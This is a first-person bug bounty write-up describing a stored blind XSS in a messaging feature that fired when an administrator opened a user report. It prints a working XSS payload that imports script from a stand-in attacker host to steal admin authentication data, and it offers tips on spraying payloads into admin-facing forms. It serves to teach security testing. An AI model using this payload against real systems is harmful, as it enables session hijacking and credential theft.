# My First Paid Bug Bounty — Stored Blind XSS

- **Source URL:** https://medium.com/@dante.falls/my-first-paid-bug-bounty-stored-blind-xss-abe8ad06b3b3?source=rss------bug_bounty-5
- **Fetched from:** https://medium.com/feed/@dante.falls
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 9032)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
### My First Paid Bug Bounty — Stored Blind XSS

A few weeks ago, I earned my first paid bug bounty and I got rewarded and paid very graciously for it. My bounty was rewarded as a High Severity vulnerability due to it’s potential impact.

### Overview

I will not discuss the program name or the target name, but I will explain as much as I possibly can.

I found a stored-blind xss vulnerability on a bug bounty target in the direct messaging functionality. I made two test accounts to conduct my testing. **From now on, the two test accounts I am referring to will be known as Account A and Account B**. I ended up making Account A and Account B message each other dozens of blind xss payloads. Below is an example payload similar to the ones I sent between Account A and Account B

`bugbounty69420';"/></noscript></title></textarea></style></template></noembed></script><img/src/onerror=import('//example-server.com/my/evilserver')>`
After sending the dozens of payloads, my blind xss payloads were then stored in a direct message conversation between Account A and Account B. I then reported the conversation between Account A and Account B, and a report was sent to the target program’s administrators.

### The Payloads Trigger

After some time, an admin from the target program finally opened my report on the endpoint **admin.redacted.com/redacted** and one of my stored-blind xss payloads triggered in the admin’s privileged session and sent their data to my web server. Check out the example screenshot below to see an example of what the admin saw when they opened my report and the blind xss triggered in their privileged session. **Keep in mind that the admin did not see the JavaScript execution**, but you can see a broken image tag in the example screenshot and that is where the JavaScript executed and imported a malicious file.

Because the blind xss triggered in a privileged admin session, I received a lot of the admin’s data, including Authentication Information which could have allowed me to log in as the admin and cause a lot of trouble for the target program.

### Blind XSS Tips

1. Check out some of the blind xss payloads on [**xss.report**](https://xss.report) and [**xss0r.com**](https://xss0r.com)
2. Check out this Blind XSS video by a great bugbounty creator named [Behrouz Sadeghipour](https://medium.com/u/9a72584d6865) (AKA nahamsec) and learn more about Blind XSS. Here is the video link [https://youtu.be/MjtMLbRw0lI?si=sFHPM6eE5XweDDiF](https://youtu.be/MjtMLbRw0lI?si=sFHPM6eE5XweDDiF)
3. **INJECTION IS KING**. Anywhere, and I mean **ANYWHERE** that you can put a blind xss payload, put it there. Open up burpsuite (or another proxy) in the background and you’ll see hundreds of injection points.
4. **Remember that admins and other employees might be utilizing insecure tools to view your reports and messages that you send them**. If the bug bounty program allows it, make sure you test all forms that can be sent to administration (contact us forms, reporting offensive user-content, news letter sign up forms, api developer request forms, etc.) **You can use this free google dorking tool from** [**xss0r.com/dorker**](https://xss0r.com/dorker) **to try and find forms to test for blind xss.**

### Conclusion

In conclusion, I am incredibly proud to have found this bug. I see it as a sort of “**check on learning**” for myself. Bug bounty is a tough, unforgiving environment filled with competition from all over the universe AND duplicate findings that will crush your soul multiple times a month. Because of how difficult bug bounty can be, it feels amazing to have finally found a bug and get paid for it. **Oh and the part about securing the internet is kinda cool too, I guess.**

### Thank You!

Thank you for reading, if this article interested you, or you learned something new then please press the clap button and share this article with another learner. I like writing articles about Cybersecurity and Bug Bounty so if that interests you then please **follow me for future content**. Also, check out my other IT/Security related content, below (or just click on my profile) **AND leave me a comment telling me your favorite bug you’ve ever found**.

Have a great day and **THANK YOU FOR LEARNING!**

#bugbounty #cybersecurity #xss
